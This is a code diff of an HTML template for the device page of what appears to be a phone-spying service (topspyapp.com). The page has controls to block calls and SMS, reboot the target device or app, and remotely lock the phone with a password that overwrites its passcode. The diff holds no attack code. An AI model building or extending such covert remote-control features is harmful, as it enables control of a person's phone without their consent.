@@ -1,10 +1,12 @@
 <div>
     <h1 class="text-center">{$title}</h1>
 
-    {insert "inc.flashMessages.htm"}
-
     <div class="container-fluid">
         <div class="row">
+            <div class="col-lg-12">
+                {insert "inc.flashMessages.htm"}
+            </div>
+            
             <div class="col-lg-6 col-md-6">
                 <div class="panel panel-default">
                     <div class="panel-heading">{if $data.blockSMSActive}{$di.t->_('Calls & SMS blocking')}{else}{$di.t->_('Blacklist Phone numbers')}{/if}<span class="blue-asterisk">*</span></div>
@@ -32,7 +34,7 @@
                         <form role="form" action="" method="post">
                             <div class="form-group">
                                 <label>{$di.t->_('Device Name')}</label>
-                                <input type="text" name="name" value="{$data.devInfo.name}" class="form-control">
+                                <input type="text" name="name" value="{$di.currentDevice.name}" class="form-control">
                             </div>
                             {if $data.blockSMSActive}
                             <div class="form-group">
@@ -55,17 +57,17 @@
                     <div class="panel-body">
                         <div class="device-status">
                             <div class="name">{$di.t->_('Device status')}:</div>
-                            <div class="value{if $data.online} {if $data.settings.network=='wifi'}wifi{else}mobile{/if}{else} offline{/if} wifi"></div>
+                            <div class="value{if $di.currentDevice.online} {if $di.currentDevice.network=='wifi'}wifi{else}mobile{/if}{else} offline{/if}"></div>
                         </div>
                     </div>
                 </div>
+                {*
                 <div class="panel panel-default">
                     <div class="panel-body text-center">
                         <h4>{$di.t->_('This device is on %1$s plan!', ['<span class="text-primary">' ~ $data.plan ~ '</span>'])}</h4>
                         <a href="http://www.topspyapp.com/pricing-and-plans/?dev_id={$di.devId}" class="btn btn-warning">{$di.t->_('Upgrade')}</a>
                     </div>
                 </div>
-                {*
                 <div class="panel panel-default">
                     <div class="panel-body text-center">
                         <div class="settings-box">
@@ -80,11 +82,11 @@
                     </div>
                 </div>
                 *}
-                {if $data.reloadActive}
+                {if $data.rebootApplicationActive || $data.rebootDeviceActive}
                 <div class="panel panel-default">
                     <div class="panel-body">
-                        <button type="submit" id="rebootDevice" class="btn btn-danger">{$di.t->_('Reboot Device')}</button>
-                        <button type="submit" id="rebootApp" class="btn btn-danger">{$di.t->_('Reboot Application')}</button>
+                        {if $data.rebootDeviceActive}<button type="submit" id="rebootDevice" class="btn btn-danger">{$di.t->_('Reboot Device')}</button>{/if}
+                        {if $data.rebootApplicationActive}<button type="submit" id="rebootApp" class="btn btn-danger">{$di.t->_('Reboot Application')}</button>{/if}
                     </div>
                 </div>
                 {/if}
@@ -96,7 +98,7 @@
                                 <label for="password">{$di.t->_('Lock device with password')}<span class="blue-asterisk">*</span></label>
                                 <input type="text" name="password" id="password" value="" class="form-control">
                                 <p class="help-block">{$di.t->_('Only 4 digits!')}</p>
-                                {if $data.devInfo.os == 'ios'}<p class="text-info">{$di.t->_('This is a one-time password used for additional authentication. If you already have a password set on the phone, the new one-time password will be written over it. To unblock the phone, enter the new password (the "wrong password" alert will pop up) and then enter the original password.')}</p>{/if}
+                                {if $di.currentDevice.os == 'ios'}<p class="text-info">{$di.t->_('This is a one-time password used for additional authentication. If you already have a password set on the phone, the new one-time password will be written over it. To unblock the phone, enter the new password (the "wrong password" alert will pop up) and then enter the original password.')}</p>{/if}
                             </div>
                             <button type="submit" name="lockDevice" class="btn btn-danger">{$di.t->_('Lock')}</button>
                         </form>
